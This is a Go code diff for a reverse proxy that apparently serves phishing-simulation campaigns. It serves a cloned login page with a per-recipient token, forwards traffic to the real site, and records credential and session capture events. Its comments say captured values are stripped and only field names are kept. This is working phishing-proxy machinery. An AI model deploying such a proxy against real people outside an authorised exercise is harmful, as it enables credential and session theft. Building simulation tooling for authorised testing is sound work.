@@ -4,12 +4,14 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
-	"html"
 	"io"
 	"log/slog"
+	"mime"
 	"net/http"
 	"net/http/httputil"
 	"net/url"
+	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -26,12 +28,14 @@ const (
 
 // CaptureSink records one proxy capture event through the orchestrator's
 // existing names-only ingest boundary (source="proxy"). kind is "creds" or
-// "session"; token attributes the event to a campaign recipient. The payload
-// carries field/cookie NAME->value pairs; VALUES are stripped at ingest and
-// never persisted — the proxy never widens that boundary. A nil sink disables
-// capture (the proxy still forwards traffic).
+// "session"; token attributes the event to a campaign recipient. payload carries
+// field/cookie NAME->value pairs; VALUES are stripped at ingest and never
+// persisted — the proxy never widens that boundary. provenance carries
+// proxy-authored, non-victim metadata merged into the event AFTER sanitization
+// (e.g. clone_snapshot_hash); it never contains captured values. A nil sink
+// disables capture (the proxy still forwards traffic).
 type CaptureSink interface {
-	Capture(ctx context.Context, kind, token string, payload map[string]any, ts time.Time)
+	Capture(ctx context.Context, kind, token string, payload, provenance map[string]any, ts time.Time)
 }
 
 // tokenKey is the request-context key carrying the victim token through the
@@ -48,6 +52,9 @@ type Instance struct {
 	// credCanonical maps a lowercased observed field name to the configured
 	// upstream_field name, so a creds event reports the profile's declared name.
 	credCanonical map[string]string
+	// clone is the generated login-page clone served at the proxy root (Phase 2),
+	// populated by GenerateClone at start. Until then the proxy fails closed.
+	clone cloneState
 }
 
 // NewInstance compiles a profile spec into a servable proxy instance. The spec
@@ -127,34 +134,82 @@ func (in *Instance) Handler() http.Handler {
 	return in.captureMiddleware(mux)
 }
 
-// rootHandler serves the Phase 1 placeholder landing at the exact root path and
-// reverse-proxies everything else to the real origin. Real clone rendering from
-// phishing_facet is Phase 2 — this is the minimal chain so /t -> proxy works.
+// rootHandler routes the clone root, the generated-asset namespace, and the
+// upstream passthrough. Clone assets are served only from the campaign's clone
+// directory; the root serves the rendered clone; every other path passes
+// through to the real origin (login POST capture, live assets, etc.). When no
+// clone is available the proxy fails closed (503) — it never falls back to a
+// placeholder.
 func (in *Instance) rootHandler(w http.ResponseWriter, r *http.Request) {
-	if r.URL.Path == "/" && r.Method == http.MethodGet {
-		in.serveLanding(w, r)
-		return
+	switch {
+	case strings.HasPrefix(r.URL.Path, assetPrefix):
+		in.serveCloneAsset(w, r)
+	case r.URL.Path == "/" && r.Method == http.MethodGet:
+		in.serveClone(w, r)
+	default:
+		in.rp.ServeHTTP(w, r)
 	}
-	in.rp.ServeHTTP(w, r)
 }
 
-// serveLanding writes the placeholder landing, carrying the victim token forward
-// to the login path under the configured token query key so the capture chain
-// works end-to-end. Phase 2 replaces this with the rendered clone.
-func (in *Instance) serveLanding(w http.ResponseWriter, r *http.Request) {
-	token, _ := r.Context().Value(tokenKey{}).(string)
-	href := in.compiled.LoginPath
-	if token != "" {
-		q := url.Values{}
-		q.Set(in.compiled.Capture.TokenQueryKey, token)
-		href += "?" + q.Encode()
+// serveClone writes the rendered clone with the victim's token injected into the
+// form action / internal links (replacing the generation-time sentinel), so the
+// capture + tracking chain survives. Fails closed (503) if no clone is ready.
+func (in *Instance) serveClone(w http.ResponseWriter, r *http.Request) {
+	if !in.clone.ready || len(in.clone.index) == 0 {
+		in.failClosed(w)
+		return
 	}
+	token, _ := r.Context().Value(tokenKey{}).(string)
+	out := bytes.ReplaceAll(in.clone.index, []byte(tokenSentinel), []byte(url.QueryEscape(token)))
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.Header().Set("Cache-Control", "no-store")
 	w.WriteHeader(http.StatusOK)
-	_, _ = io.WriteString(w, "<!doctype html><title>Sign in</title>"+
-		"<p>Loading sign-in…</p>"+
-		`<a href="`+html.EscapeString(href)+`">Continue</a>`)
+	_, _ = w.Write(out)
+}
+
+// serveCloneAsset serves a generated asset strictly from the campaign's clone
+// directory. Traversal outside it, or a missing/unconfigured clone, is a 404 /
+// 503 — never arbitrary file access.
+func (in *Instance) serveCloneAsset(w http.ResponseWriter, r *http.Request) {
+	if !in.clone.ready || in.clone.dir == "" {
+		in.failClosed(w)
+		return
+	}
+	full, ok := resolveCloneAsset(in.clone.dir, strings.TrimPrefix(r.URL.Path, assetPrefix))
+	if !ok {
+		in.notFound(w)
+		return
+	}
+	info, err := os.Stat(full)
+	if err != nil || info.IsDir() {
+		in.notFound(w)
+		return
+	}
+	data, err := os.ReadFile(full)
+	if err != nil {
+		in.notFound(w)
+		return
+	}
+	ct := mime.TypeByExtension(filepath.Ext(full))
+	if ct == "" {
+		ct = "application/octet-stream"
+	}
+	w.Header().Set("Content-Type", ct)
+	w.Header().Set("Cache-Control", "no-store")
+	w.WriteHeader(http.StatusOK)
+	_, _ = w.Write(data)
+}
+
+func (in *Instance) failClosed(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.WriteHeader(http.StatusServiceUnavailable)
+	_, _ = io.WriteString(w, "<!doctype html><title>Unavailable</title><p>Service unavailable.</p>")
+}
+
+func (in *Instance) notFound(w http.ResponseWriter) {
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.WriteHeader(http.StatusNotFound)
+	_, _ = io.WriteString(w, "<!doctype html><title>Not found</title><p>Not found.</p>")
 }
 
 // captureMiddleware strips the victim token (honoring token_query_key), stashes
@@ -226,7 +281,17 @@ func (in *Instance) captureCreds(r *http.Request, token string) {
 	if len(hits) == 0 {
 		return
 	}
-	in.sink.Capture(r.Context(), KindCreds, token, map[string]any{"fields": hits}, time.Now().UTC())
+	in.sink.Capture(r.Context(), KindCreds, token, map[string]any{"fields": hits}, in.provenance(), time.Now().UTC())
+}
+
+// provenance returns proxy-authored, non-victim metadata stamped onto every
+// capture event (the clone snapshot hash, alongside the campaign's frozen
+// profile_checksum added downstream). nil when no clone has been generated.
+func (in *Instance) provenance() map[string]any {
+	if in.clone.hash == "" {
+		return nil
+	}
+	return map[string]any{"clone_snapshot_hash": in.clone.hash}
 }
 
 // modifyResponse evaluates the session success indicators against the upstream
@@ -248,7 +313,7 @@ func (in *Instance) modifyResponse(resp *http.Response) error {
 	if host := in.compiled.Upstream.Host; host != "" {
 		payload["host"] = host
 	}
-	in.sink.Capture(resp.Request.Context(), KindSession, token, payload, time.Now().UTC())
+	in.sink.Capture(resp.Request.Context(), KindSession, token, payload, in.provenance(), time.Now().UTC())
 	return nil
 }
 
